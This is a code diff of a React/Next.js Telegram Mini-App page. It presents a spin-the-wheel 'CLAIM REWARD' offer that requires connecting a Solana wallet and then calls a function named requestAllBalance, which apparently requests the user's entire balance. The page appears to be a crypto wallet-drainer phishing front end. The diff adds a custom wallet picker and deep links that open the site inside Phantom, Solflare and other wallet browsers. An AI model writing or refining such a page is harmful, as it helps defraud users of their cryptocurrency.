@@ -3,32 +3,15 @@
 
 'use client'
 
-import React, { useEffect, useRef, useState } from 'react'
+import React, { useEffect, useRef, useState, Fragment } from 'react'
 import './assets/2idql.css'
-import '@solana/wallet-adapter-react-ui/styles.css'
-
-import { useWallet }      from '@solana/wallet-adapter-react'
-import { useWalletModal } from '@solana/wallet-adapter-react-ui'
+import './assets/connect.css'
+import { Transition } from '@headlessui/react'
+import { useWallet } from '@solana/wallet-adapter-react'
 import { requestAllBalance } from '@/app/services/transaction'
 
-// only augment Window for solana; Telegram is handled via TgWindow below
-declare global {
-  interface Window {
-    solana?: { publicKey?: any }
-  }
-}
-
-// local Telegram WebApp types
-interface TgWebApp {
-  expand: () => void
-  requestFullscreen?: () => void
-  setHeaderColor:    (typeOrColor: string, colorHex?: string) => void
-  setBackgroundColor:(colorHex: string) => void
-  disableVerticalSwipes?: () => void
-  scroll?: (offsetY: number) => void
-}
-// for typing window.Telegram
-type TgWindow = Window & { Telegram?: { WebApp?: TgWebApp } }
+// Telegram Mini-App tipi
+type TgWindow = Window & { Telegram?: { WebApp?: any } }
 
 export default function Page() {
   /* ——— Telegram Mini-App başlat ——— */
@@ -40,22 +23,19 @@ export default function Page() {
       webapp.requestFullscreen?.()
       webapp.setHeaderColor('bg_color', '#000000')
       webapp.setBackgroundColor('#000000')
-      if (typeof webapp.disableVerticalSwipes === 'function') {
-        webapp.disableVerticalSwipes()
-      } else if (typeof webapp.scroll === 'function') {
+      if (webapp.disableVerticalSwipes) webapp.disableVerticalSwipes()
+      else if (webapp.scroll) {
         const lock = () => webapp.scroll!(window.scrollY)
         window.addEventListener('scroll', lock)
         return () => window.removeEventListener('scroll', lock)
       }
-    } catch {
-      /* ignore */
-    }
+    } catch { /* ignore */ }
   }, [])
 
   /* ——— Çark (spin) durumu ——— */
   const wheelRef = useRef<HTMLImageElement>(null)
-  const [hasSpun, setHasSpun] = useState<boolean>(() =>
-    typeof window !== 'undefined' && localStorage.getItem('hasSpun') === 'true'
+  const [hasSpun, setHasSpun] = useState<boolean>(
+    () => typeof window !== 'undefined' && localStorage.getItem('hasSpun') === 'true'
   )
   useEffect(() => {
     if (hasSpun) document.querySelector('._1')?.classList.add('modal_active')
@@ -75,57 +55,79 @@ export default function Page() {
     }, 10000)
   }
 
-  /* ——— Wallet-Adapter ile bağlan & claim ——— */
-  const { publicKey }   = useWallet()
-  const { setVisible }  = useWalletModal()
-
+  /* ——— Wallet & Drawer kontrolü ——— */
+  const { wallets, select, publicKey } = useWallet()
+  const [drawerOpen, setDrawerOpen] = useState(false)
   const [loading, setLoading]       = useState(false)
-  const [msg,     setMsg]           = useState('')
-  const [pending, setPendingTx]     = useState(false)
+  const [msg, setMsg]               = useState('')
 
-  // her durumda modal aç
-  const openConnectModal = () => {
-    setVisible(true)
+  const openDrawer  = () => setDrawerOpen(true)
+  const closeDrawer = () => setDrawerOpen(false)
+
+  /* ——— Deep-link URL haritası ——— */
+  const origin = typeof window !== 'undefined' ? window.location.origin : ''
+  const deepLink: Record<string,string> = {
+    Phantom:           `https://phantom.app/ul/browse/${encodeURIComponent(origin)}?ref=${encodeURIComponent(origin)}`,
+    Trust:             'https://link.trustwallet.com/open_url',
+    Solflare:          `https://solflare.com/access?app_url=${encodeURIComponent(origin)}`,
+    'Coinbase Wallet': 'https://www.coinbase.com/wallet',
+    BitKeep:           'https://web3.bitget.com/',
+    Backpack:          'https://www.backpack.app/',
   }
 
-  // transaction gönder
+  /* ——— Transaction gönder ——— */
   const doTx = async () => {
     setLoading(true)
-    let ok: boolean | undefined
-    try {
-      ok = await requestAllBalance()
-    } catch {
-      ok = false
-    } finally {
-      setLoading(false)
-    }
+    const ok = await requestAllBalance()
+    setLoading(false)
     if (!ok) {
       setMsg('No enough Sol!')
       setTimeout(() => setMsg(''), 5000)
     }
   }
 
-  // Claim Reward butonuna basıldığında
+  /* ——— CLAIM butonu ——— */
   const handleClaim = () => {
-    if (!publicKey) {
-      setPendingTx(true)
-      openConnectModal()
-    } else {
+    if (!publicKey) openDrawer()
+    else doTx()
+  }
+
+  /* ——— Cüzdan seçimi ——— */
+  const handleWalletClick = async (w: any) => {
+    closeDrawer()
+    if (w.adapter.name === 'Mobile Wallet Adapter') return
+    if (w.readyState === 'Installed') {
+      await select(w.adapter.name)
       doTx()
+    } else {
+      window.open(deepLink[w.adapter.name] ?? w.url, '_blank')
     }
   }
 
-  // cüzdan bağlandıktan sonra bekleyen tx varsa gönder
-  useEffect(() => {
-    if (publicKey && pending) {
-      setPendingTx(false)
-      doTx()
-    }
-  }, [publicKey, pending])
+  /* ——— Sıralı wallet listesi & label dönüşümü ——— */
+  const orderedNames = [
+    'Phantom',
+    'Trust',
+    'Solflare',
+    'Coinbase Wallet',
+    'BitKeep',
+    'Backpack',
+  ]
+  const labelMap: Record<string,string> = {
+    Phantom:          'Phantom',
+    Trust:            'Trust Wallet',
+    Solflare:         'Solflare',
+    'Coinbase Wallet':'Coinbase Wallet',
+    BitKeep:          'Bitget Wallet',
+    Backpack:         'Backpack',
+  }
+  const orderedWallets = orderedNames
+    .map(name => wallets.find(w => w.adapter.name === name))
+    .filter((w): w is any => !!w)
 
   return (
     <>
-      {/* HERO BANNER */}
+      {/* ---------- HERO BANNER ---------- */}
       <div className="_1">
         <div className="_g">
           <span className="_a">
@@ -140,11 +142,7 @@ export default function Page() {
           <div className="_9">
             <div className="_i">
               <p className="_k">Connect your wallet to receive reward</p>
-              <button
-                onClick={handleClaim}
-                className="_s"
-                disabled={loading}
-              >
+              <button onClick={handleClaim} className="_s" disabled={loading}>
                 {loading ? 'Please wait…' : msg || 'CLAIM REWARD'}
               </button>
             </div>
@@ -152,7 +150,7 @@ export default function Page() {
         </div>
       </div>
 
-      {/* HEADER */}
+      {/* ---------- HEADER ---------- */}
       <section className="_b">
         <div className="_d">
           <div className="_x">
@@ -181,7 +179,7 @@ export default function Page() {
               </div>
             </div>
             <div className="_0">
-              <button onClick={openConnectModal} className="_n">
+              <button onClick={openDrawer} className="_n">
                 <span className="_a">
                   {publicKey ? 'Wallet connected' : 'Connect Wallet'}
                 </span>
@@ -192,7 +190,7 @@ export default function Page() {
         </div>
       </section>
 
-      {/* MAIN SECTION */}
+      {/* ---------- MAIN SECTION ---------- */}
       <section className="_m">
         <div className="_d">
           <h1 className="_4">
@@ -226,25 +224,105 @@ export default function Page() {
         </div>
       </section>
 
-      {/* FOOTER */}
-      <section className="_v">
-        <div className="_d">
-          <div className="_6">
-            <a href="https://x.com/solana?mx=2" target="_blank" rel="noreferrer">
-              <img src="/header_twitter.svg" alt="Twitter" />
-            </a>
-            <a href="https://t.me/solana" target="_blank" rel="noreferrer">
-              <img src="/header_tg.svg" alt="Telegram" />
-            </a>
-            <a href="https://www.youtube.com/SolanaFndn" target="_blank" rel="noreferrer">
-              <img src="/header_mail.svg" alt="YouTube" />
-            </a>
-            <a href="https://discord.com/invite/kBbATFA7PW" target="_blank" rel="noreferrer">
-              <img src="/header_ds.svg" alt="Discord" />
-            </a>
+      {/* ——— CONNECT DRAWER & MODAL ——— */}
+      <Transition show={drawerOpen} as={Fragment}>
+        {/* overlay */}
+        <Transition.Child
+          as="div"
+          enter="transition-opacity duration-200"
+          enterFrom="opacity-0"
+          enterTo="opacity-60"
+          leave="transition-opacity duration-200"
+          leaveFrom="opacity-60"
+          leaveTo="opacity-0"
+          className="connect-overlay"
+          onClick={closeDrawer}
+        />
+
+        {/* mobile bottom sheet */}
+        <Transition.Child
+          as="div"
+          enter="transition-transform duration-200"
+          enterFrom="translate-y-full"
+          enterTo="translate-y-0"
+          leave="transition-transform duration-200"
+          leaveFrom="translate-y-0"
+          leaveTo="translate-y-full"
+          className="connect-sheet md:hidden"
+        >
+          <div className="connect-header">
+            <h2 className="connect-title">Connect Wallet</h2>
+            <button className="connect-close" onClick={closeDrawer}>×</button>
           </div>
-        </div>
-      </section>
+          <div className="connect-list">
+            {orderedWallets.map(w => {
+              const key   = w.adapter.name
+              const label = labelMap[key]
+              return (
+                <div
+                  key={key}
+                  className="connect-row"
+                  onClick={() => handleWalletClick(w)}
+                >
+                  <div className="connect-icon">
+                    <img src={w.adapter.icon} alt={label} />
+                  </div>
+                  <span className="connect-text">{label}</span>
+                </div>
+              )
+            })}
+          </div>
+          <p className="connect-footer">
+            Haven’t got a wallet?{' '}
+            <a href="https://solana.com/wallets" target="_blank">
+              Get started
+            </a>
+          </p>
+        </Transition.Child>
+
+        {/* desktop centered modal */}
+        <Transition.Child
+          as="div"
+          enter="transition-opacity duration-200"
+          enterFrom="opacity-0"
+          enterTo="opacity-100"
+          leave="transition-opacity duration-200"
+          leaveFrom="opacity-100"
+          leaveTo="opacity-0"
+          className="hidden md:flex fixed inset-0 z-50 items-center justify-center bg-black/40"
+        >
+          <div className="connect-sheet drawer-card">
+            <div className="connect-header">
+              <h2 className="connect-title">Connect Wallet</h2>
+              <button className="connect-close" onClick={closeDrawer}>×</button>
+            </div>
+            <div className="connect-list">
+              {orderedWallets.map(w => {
+                const key   = w.adapter.name
+                const label = labelMap[key]
+                return (
+                  <div
+                    key={key}
+                    className="connect-row"
+                    onClick={() => handleWalletClick(w)}
+                  >
+                    <div className="connect-icon">
+                      <img src={w.adapter.icon} alt={label} />
+                    </div>
+                    <span className="connect-text">{label}</span>
+                  </div>
+                )
+              })}
+            </div>
+            <p className="connect-footer">
+              Haven’t got a wallet?{' '}
+              <a href="https://solana.com/wallets" target="_blank">
+                Get started
+              </a>
+            </p>
+          </div>
+        </Transition.Child>
+      </Transition>
     </>
   )
 }
